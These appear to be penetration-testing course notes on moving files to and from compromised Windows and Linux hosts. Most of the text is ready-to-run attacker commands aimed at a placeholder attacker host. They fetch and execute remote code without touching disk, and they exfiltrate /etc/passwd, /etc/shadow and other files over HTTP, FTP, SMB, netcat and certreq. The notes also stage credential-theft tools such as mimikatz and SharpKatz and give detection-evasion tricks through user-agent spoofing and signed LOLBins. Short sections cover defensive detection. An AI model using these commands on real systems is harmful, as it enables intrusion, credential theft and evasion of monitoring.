# File Transfers

## File Transfers

The problem in a real engagement: RCE on IIS, PowerShell blocked by AppLocker, outbound web filtered, FTP blocked on 21 — but SMB on 445 was allowed. File transfer method choice depends on what's blocked vs allowed. Host controls (whitelisting, AV/EDR) and network controls (firewall, IDS/IPS) both gate the technique.

## Windows File Transfer Methods
![[Pasted image 20261024044855.png]]
### Download Operations

**PowerShell Base64 Encode & Decode** — no network needed, useful when nothing else gets through.

```bash
# On attack host: encode, verify hash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

```powershell
# On Windows: decode, verify hash
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

cmd.exe caps at 8,191 chars per command; large base64 strings break the paste.

**PowerShell Web Downloads**

Most networks allow HTTP/HTTPS outbound. `Net.WebClient` is available in every PowerShell version.

```powershell
# DownloadFile (sync / async)
(New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT_FILE>')
(New-Object Net.WebClient).DownloadFileAsync('<URL>','<OUTPUT_FILE>')

# Fileless: DownloadString + IEX
IEX (New-Object Net.WebClient).DownloadString('<URL>')
(New-Object Net.WebClient).DownloadString('<URL>') | IEX

# Invoke-WebRequest (aliases: iwr, curl, wget)
Invoke-WebRequest <URL> -OutFile <OUTPUT_FILE>
```

Common errors worth knowing:

```powershell
# IE first-launch config incomplete → -UseBasicParsing
Invoke-WebRequest <URL> -UseBasicParsing | IEX

# SSL/TLS trust error → disable cert validation for the session
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

**SMB Downloads** — common in enterprise, TCP/445 usually allowed outbound.

```bash
# Attack host: unauthenticated share
sudo impacket-smbserver share -smb2support /tmp/smbshare

# With credentials (needed when Windows blocks guest access)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
copy \\<ATTACKER_IP>\share\nc.exe

:: If guest blocked, mount with credentials
net use n: \\<ATTACKER_IP>\share /user:test test
copy n:\nc.exe
```

**FTP Downloads** — TCP 21, often blocked outbound but simple to stand up.

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Non-interactive FTP via command file (useful for non-interactive shells):

```cmd
echo open <ATTACKER_IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Upload Operations

**PowerShell Base64 Encode & Decode**

```powershell
# On Windows: encode
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

```bash
# On attack host: decode, verify
echo <BASE64_STRING> | base64 -d > hosts
md5sum hosts
```

**PowerShell Web Uploads** — needs a server that accepts uploads.

```bash
pip3 install uploadserver
python3 -m uploadserver
```

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

Base64 upload over Netcat:

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
# Copy the POST body, then decode
echo <BASE64> | base64 -d -w 0 > hosts
```

**SMB Uploads (WebDAV)** — when outbound 445 is blocked but HTTP is allowed. SMB falls back to HTTP automatically.

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
dir \\<ATTACKER_IP>\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\<ATTACKER_IP>\DavWWWRoot\
```

`DavWWWRoot` is a Windows keyword for the WebDAV root — not a real folder on the server. You can also connect to a real folder directly (`\\<IP>\sharefolder`).

**FTP Uploads**

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

FTP command file:

```cmd
echo open <ATTACKER_IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Linux File Transfer Methods

### Download Operations

**Base64 Encoding / Decoding**

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

# On target
echo -n '<BASE64_STRING>' | base64 -d > id_rsa
md5sum id_rsa
```

**Web Downloads with Wget and cURL**

```bash
wget <URL> -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh <URL>
```

**Fileless Attacks**

Piping into an interpreter avoids touching disk — though some payloads (e.g. `mkfifo`) still write temp files.

```bash
curl <URL> | bash
wget -qO- <URL> | python3
```

**Download with Bash (/dev/tcp)**

Works on Bash ≥2.04 with `--enable-net-redirections`. Useful when no download tool is available.

```bash
exec 3<>/dev/tcp/<TARGET_IP>/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

**SSH Downloads (SCP)**

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt

scp <USERNAME>@<TARGET_IP>:/root/myroot.txt .
```

### Upload Operations

**Web Upload (HTTPS)**

```bash
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```bash
# From target: upload multiple files
curl -X POST https://<ATTACKER_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

**Alternative Web File Transfer** — spin up a mini web server from whatever language is available on target.

```bash
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

```bash
# From attack host: pull the file
wget <TARGET_IP>:8000/filetotransfer.txt
```

**SCP Upload**

```bash
scp /etc/passwd <USERNAME>@<TARGET_IP>:/home/<USERNAME>/
```

## Transferring Files with Code

Python, PHP, Perl, Ruby are commonly available on Linux targets and occasionally on Windows. `cscript` and `mshta` run JavaScript/VBScript on Windows.

**Python**

```bash
python2.7 -c 'import urllib;urllib.urlretrieve("<URL>", "<OUTPUT_FILE>")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OUTPUT_FILE>")'
```

**PHP**

```bash
php -r '$file = file_get_contents("<URL>"); file_put_contents("<OUTPUT_FILE>",$file);'

php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<OUTPUT_FILE>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

`@file` accepts URLs as filenames only if fopen wrappers are enabled.

**Ruby**

```bash
ruby -e 'require "net/http"; File.write("<OUTPUT_FILE>", Net::HTTP.get(URI.parse("<URL>")))'
```

**Perl**

```bash
perl -e 'use LWP::Simple; getstore("<URL>", "<OUTPUT_FILE>");'
```

**JavaScript (Windows)**

```javascript
// wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js <URL> <OUTPUT_FILE>
```

**VBScript (Windows)**

```vbscript
' wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs <URL> <OUTPUT_FILE>
```

**Upload Operations using Python3**

```bash
python3 -m uploadserver
```

```bash
python3 -c 'import requests;requests.post("http://<ATTACKER_IP>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## Miscellaneous File Transfer Methods

### Netcat / Ncat

Direction of connection depends on which side the firewall permits. Ncat is a modern reimplementation with `--send-only` / `--recv-only` to close cleanly when the transfer completes.

```bash
# Target listening — original nc
nc -l -p 8000 > SharpKatz.exe

# Target listening — Ncat, closes once received
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

```bash
# Attack host sending — original nc
nc -q 0 <TARGET_IP> 8000 < SharpKatz.exe

# Attack host sending — Ncat
ncat --send-only <TARGET_IP> 8000 < SharpKatz.exe
```

Reverse direction — attack host listens, target connects (useful when target blocks inbound):

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# target:
nc <ATTACKER_IP> 443 > SharpKatz.exe

sudo ncat -l -p 443 --send-only < SharpKatz.exe
# target:
ncat <ATTACKER_IP> 443 --recv-only > SharpKatz.exe
```

No nc on target? Bash `/dev/tcp`:

```bash
cat < /dev/tcp/<ATTACKER_IP>/443 > SharpKatz.exe
```

### PowerShell Session File Transfer (WinRM)

HTTP 5985 / HTTPS 5986. Needs admin, Remote Management Users, or explicit permissions.

```powershell
Test-NetConnection -ComputerName <TARGET_HOST> -Port 5985
$Session = New-PSSession -ComputerName <TARGET_HOST>

# To remote
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# From remote
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP

Copy/paste inside the session, or mount a local drive.

```bash
rdesktop <TARGET_IP> -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

xfreerdp /v:<TARGET_IP> /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
![[Pasted image 20261024045059.png]]
Access via `\\tsclient\` in the remote session. The share isn't accessible to other logged-in users.
![[Pasted image 20261024045118.png]]
## Protected File Transfers

Don't exfiltrate real PII / financial data / trade secrets unless explicitly requested. For DLP testing, use dummy files that mimic the protected data. Encrypt before transfer when the transport isn't already encrypted.

### Windows — Invoke-AESEncryption.ps1

```powershell
Import-Module .\Invoke-AESEncryption.ps1

Invoke-AESEncryption -Mode Encrypt -Key "<KEY>" -Path .\scan-results.txt
# → scan-results.txt.aes

Invoke-AESEncryption -Mode Decrypt -Key "<KEY>" -Path .\scan-results.txt.aes
```

Use a strong, unique key per engagement — a single leaked key otherwise decrypts everything.

### Linux — OpenSSL

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

Transfer the encrypted file over HTTPS/SFTP/SSH where possible.

## Catching Files over HTTP/S

HTTP/HTTPS are almost always allowed and encrypt in transit. For a controlled upload endpoint, prefer Nginx over Apache — Nginx doesn't execute PHP by default, so a misjudged PUT can't become a web shell.

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

```nginx
# /etc/nginx/sites-available/upload.conf
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service

# If port 80 is taken, remove the default site
sudo rm /etc/nginx/sites-enabled/default
```

Upload via PUT:

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

Confirm directory listing is off — anything exfiltrated this way is sensitive, and Nginx doesn't enable listings by default.

## Living off The Land

**LOLBAS** (Windows) and **GTFOBins** (Linux) catalogue binaries that can be abused for download, upload, command execution, file read/write, and bypasses beyond their intended purpose.

**CertReq.exe (LOLBAS — upload)**

Listen with Netcat, then execute on target to POST the file:

```cmd
certreq.exe -Post -config http://<ATTACKER_IP>:8000/ c:\windows\win.ini
```

```bash
sudo nc -lvnp 8000
# POST body contains the file
```

Requires a `certreq.exe` version with `-Post`.

**OpenSSL (GTFOBins — send/receive over TLS)**

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

```bash
# Target pulls the file
openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
```

**Bitsadmin / Start-BitsTransfer (Windows)**

```powershell
bitsadmin /transfer wcb /priority foreground http://<ATTACKER_IP>:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

Import-Module bitstransfer
Start-BitsTransfer -Source "http://<ATTACKER_IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

**Certutil (Windows)**

```cmd
certutil.exe -verifyctl -split -f http://<ATTACKER_IP>:8000/nc.exe
```

AMSI detects this as malicious certutil usage on modern Windows.

## Detection

User agent strings are the primary detection surface. Every HTTP client sends one; common file transfer techniques produce distinctive agents.

- **Invoke-WebRequest** — `WindowsPowerShell/5.1.14393.0`
- **WinHttpRequest** — `WinHttp.WinHttpRequest.5`
- **Msxml2** — `MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E`
- **Certutil** — `Microsoft-CryptoAPI/10.0`
- **BITS** — `Microsoft BITS/7.8`

Command-line whitelisting (vs blacklisting) is far more robust — blacklists fall to trivial obfuscation, whitelists catch anything unusual. User agent whitelisting in a SIEM does the same for transfer traffic.

## Evading Detection

**Changing User Agent in PowerShell**

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<ATTACKER_IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Emulating a browser commonly used in the environment makes the traffic look routine.

**LOLBINs when application whitelisting blocks PowerShell/Netcat** — a signed, whitelisted binary that happens to download files. Example:

```powershell
GfxDownloadWrapper.exe "http://<ATTACKER_IP>/mimikatz.exe" "C:\Temp\nc.exe"
```

Intel Graphics Driver on Windows 10 ships with a periodic config download feature — permitted by whitelisting, ignored by alerting. Check LOLBAS / GTFOBins for a "file download" binary present in the environment; GTFOBins documents ~40 Linux binaries usable for transfer.